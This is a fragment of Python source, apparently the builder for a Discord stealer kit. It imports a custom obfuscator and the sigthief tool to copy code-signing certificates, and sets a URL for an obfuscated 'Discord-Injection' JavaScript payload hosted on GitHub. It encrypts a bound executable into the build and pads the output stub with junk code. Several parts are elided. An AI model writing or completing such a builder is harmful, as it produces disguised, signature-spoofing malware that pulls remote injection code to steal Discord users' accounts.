...
disable_warnings()
import RowOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/Row-c/Discord-Injection-BG/main/injection-obfuscated.js"
...
def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        ...
        with open("bound.Row", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.Row"):
        os.remove("bound.Row")
...
def main() -> None:
    ...
    obfuscator.RowOBF(code, OutCodeFile)
    junk(OutCodeFile)
